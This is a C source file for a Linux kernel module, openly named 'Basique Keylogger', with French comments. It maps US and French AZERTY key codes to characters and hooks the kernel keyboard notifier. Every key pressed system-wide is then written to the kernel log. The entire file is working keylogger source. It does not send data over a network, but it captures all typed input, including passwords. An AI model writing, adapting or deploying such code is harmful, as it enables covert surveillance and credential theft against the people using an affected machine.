#include <linux/kernel.h>             // Inclus les définitions pour les fonctions liées au noyau.
#include <linux/init.h>               // Inclus les macros et définitions pour l'initialisation et la sortie des modules.
#include <linux/module.h>             // Inclus les structures et macros pour la gestion des modules du noyau.
#include <linux/notifier.h>           // Inclus la gestion des interruptions
#include <linux/keyboard.h>           // Inclus la gestion des touches presser
#include <linux/input-event-codes.h>  // Inclus la correspondance entre un code et la touche pressé

MODULE_DESCRIPTION("Basique Keylogger");  // Description du module.
MODULE_AUTHOR("Aiden");                   // Auteur du module.
MODULE_LICENSE("GPL");                    // Licence du module (GPL : GNU General Public License).

static const char *keymapUS[] = {
    // Chiffres
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3",
    [KEY_4] = "4", [KEY_5] = "5", [KEY_6] = "6",
    [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9",
    [KEY_0] = "0",

    // Lettres
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c",
    [KEY_D] = "d", [KEY_E] = "e", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_I] = "i",
    [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o",
    [KEY_P] = "p", [KEY_Q] = "q", [KEY_R] = "r",
    [KEY_S] = "s", [KEY_T] = "t", [KEY_U] = "u",
    [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z",

    // Caractères spéciaux
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=",
    [KEY_LEFTBRACE] = "[", [KEY_RIGHTBRACE] = "]",
    [KEY_SEMICOLON] = ";", [KEY_APOSTROPHE] = "'",
    [KEY_COMMA] = ",", [KEY_DOT] = ".",
    [KEY_SLASH] = "/", [KEY_BACKSLASH] = "\\",
    [KEY_GRAVE] = "`",

    // Symboles et espaces
    [KEY_ENTER] = "\\n", [KEY_SPACE] = "[SPACE]",
    [KEY_BACKSPACE] = "[BACKSPACE]", [KEY_TAB] = "[TAB]",
    [KEY_CAPSLOCK] = "[CAPSLOCK]",

    // Modificateurs
    [KEY_LEFTSHIFT] = "[SHIFT]", [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_LEFTCTRL] = "[CTRL]", [KEY_RIGHTCTRL] = "[CTRL]",
    [KEY_LEFTALT] = "[ALT]", [KEY_RIGHTALT] = "[ALT GR]",
    [KEY_LEFTMETA] = "[SUPER]", [KEY_RIGHTMETA] = "[SUPER]",

    // Flèches
    [KEY_UP] = "[UP]", [KEY_DOWN] = "[DOWN]",
    [KEY_LEFT] = "[LEFT]", [KEY_RIGHT] = "[RIGHT]",

    // Pavé numérique
    [KEY_KP0] = "0", [KEY_KP1] = "1", [KEY_KP2] = "2",
    [KEY_KP3] = "3", [KEY_KP4] = "4", [KEY_KP5] = "5",
    [KEY_KP6] = "6", [KEY_KP7] = "7", [KEY_KP8] = "8",
    [KEY_KP9] = "9",
    [KEY_KPDOT] = ".", [KEY_KPSLASH] = "/",
    [KEY_KPASTERISK] = "*", [KEY_KPMINUS] = "-",
    [KEY_KPPLUS] = "+", [KEY_KPENTER] = "\\n",

    // Touches fonctions
    [KEY_F1] = "[F1]", [KEY_F2] = "[F2]", [KEY_F3] = "[F3]",
    [KEY_F4] = "[F4]", [KEY_F5] = "[F5]", [KEY_F6] = "[F6]",
    [KEY_F7] = "[F7]", [KEY_F8] = "[F8]", [KEY_F9] = "[F9]",
    [KEY_F10] = "[F10]", [KEY_F11] = "[F11]", [KEY_F12] = "[F12]",

    // Divers
    [KEY_ESC] = "[ESC]"
};

static const char *keymapFR[] = {
    // Chiffres
    [KEY_1] = "&", [KEY_2] = "é", [KEY_3] = "\"",
    [KEY_4] = "'", [KEY_5] = "(", [KEY_6] = "-",
    [KEY_7] = "è", [KEY_8] = "_", [KEY_9] = "ç",
    [KEY_0] = "à",

    // Lettres
    [KEY_A] = "q", [KEY_B] = "b", [KEY_C] = "c",
    [KEY_D] = "d", [KEY_E] = "e", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_I] = "i",
    [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = ",", [KEY_N] = "n", [KEY_O] = "o",
    [KEY_P] = "p", [KEY_Q] = "a", [KEY_R] = "r",
    [KEY_S] = "s", [KEY_T] = "t", [KEY_U] = "u",
    [KEY_V] = "v", [KEY_W] = "z", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "w",

    // Caractères spéciaux
    [KEY_MINUS] = ")", [KEY_EQUAL] = "=",
    [KEY_LEFTBRACE] = "^", [KEY_RIGHTBRACE] = "$",
    [KEY_SEMICOLON] = "m", [KEY_APOSTROPHE] = "ù",
    [KEY_COMMA] = ";", [KEY_DOT] = ":",
    [KEY_SLASH] = "!", [KEY_BACKSLASH] = "*",
    [KEY_GRAVE] = "²",

    // Symboles et espaces
    [KEY_ENTER] = "\\n", [KEY_SPACE] = "[SPACE]",
    [KEY_BACKSPACE] = "[BACKSPACE]", [KEY_TAB] = "[TAB]",
    [KEY_CAPSLOCK] = "[CAPSLOCK]",

    // Modificateurs
    [KEY_LEFTSHIFT] = "[SHIFT]", [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_LEFTCTRL] = "[CTRL]", [KEY_RIGHTCTRL] = "[CTRL]",
    [KEY_LEFTALT] = "[ALT]", [KEY_RIGHTALT] = "[ALT GR]",
    [KEY_LEFTMETA] = "[SUPER]", [KEY_RIGHTMETA] = "[SUPER]",

    // Flèches
    [KEY_UP] = "[HAUT]", [KEY_DOWN] = "[BAS]",
    [KEY_LEFT] = "[GAUCHE]", [KEY_RIGHT] = "[DROITE]",

    // Pavé numérique
    [KEY_KP0] = "0", [KEY_KP1] = "1", [KEY_KP2] = "2",
    [KEY_KP3] = "3", [KEY_KP4] = "4", [KEY_KP5] = "5",
    [KEY_KP6] = "6", [KEY_KP7] = "7", [KEY_KP8] = "8",
    [KEY_KP9] = "9",
    [KEY_KPDOT] = ".", [KEY_KPSLASH] = "/",
    [KEY_KPASTERISK] = "*", [KEY_KPMINUS] = "-",
    [KEY_KPPLUS] = "+", [KEY_KPENTER] = "\\n",

    // Touches fonctions
    [KEY_F1] = "[F1]", [KEY_F2] = "[F2]", [KEY_F3] = "[F3]",
    [KEY_F4] = "[F4]", [KEY_F5] = "[F5]", [KEY_F6] = "[F6]",
    [KEY_F7] = "[F7]", [KEY_F8] = "[F8]", [KEY_F9] = "[F9]",
    [KEY_F10] = "[F10]", [KEY_F11] = "[F11]", [KEY_F12] = "[F12]",

    // Divers
    [KEY_ESC] = "[ESC]"
};


/* MISE EN PLACE D'UN NOTIFIER BLOCK */

// Déclaration de la fonction de callback
static int UserKeyboard_callback(struct notifier_block *self, unsigned long pressed, void* data) {
        // Interprétation des données reçues par le clavier
	struct keyboard_notifier_param* param = data;

	if (pressed == KBD_KEYCODE && param->down) {
		int keycode = param->value; // On récupère la touche pressé
		if (keycode <= KEY_MAX && keymapFR[keycode]) {
			printk(KERN_INFO "Keylog : %s\n", keymapFR[keycode]);
		} else {
			printk(KERN_INFO "Keylog : [UNKNOW - %d]\n", keycode);
		}
	}
        return NOTIFY_OK;
}

static struct notifier_block UserKeyboard = {
	.notifier_call = UserKeyboard_callback, // Le callback
	.priority = 0,				// La priorité
};



/* MISE EN PLACE DU CHARGEMENT/DECHARGEMENT DU MODULE */

// Fonction appelée lors du chargement du module dans le noyau.
static int __init Keylogger_init(void) {
	printk(KERN_INFO "[+] Keylogger chargé avec succès.\n");
	register_keyboard_notifier(&UserKeyboard); // Ecoute les frappes du clavier
	return 0;
}

// Fonction appelée lors du déchargement du module du noyau.
static void __exit Keylogger_exit(void) {
	printk(KERN_INFO "[-] Keylogger déchargé avec succès.\n");
	unregister_keyboard_notifier(&UserKeyboard); // Désactive le hook
}

module_init(Keylogger_init);  // Spécifie la fonction d'entrée du module.
module_exit(Keylogger_exit);  // Spécifie la fonction de sortie du module.
